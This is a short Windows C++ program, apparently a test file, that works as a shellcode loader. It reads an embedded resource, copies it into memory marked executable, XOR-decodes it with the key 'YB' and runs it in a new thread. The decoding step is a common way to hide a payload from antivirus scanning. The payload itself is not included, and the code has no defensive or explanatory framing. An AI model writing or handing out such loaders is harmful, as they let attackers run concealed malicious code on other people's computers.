// test_cpp.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include "resource.h"

void main()
{
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RC_DATA1), L"RC_DATA");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);


	
	PVOID shellcode_exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcodeResouceData, shellcodeSize);


	char s[] = "YB";
	for (int i = 0; i < shellcodeSize; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ s[i % 2];
	}

	//PDWORD old{};
	//VirtualProtect(shellcode_exec, shellcodeSize, PAGE_EXECUTE_READ, old); 

	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}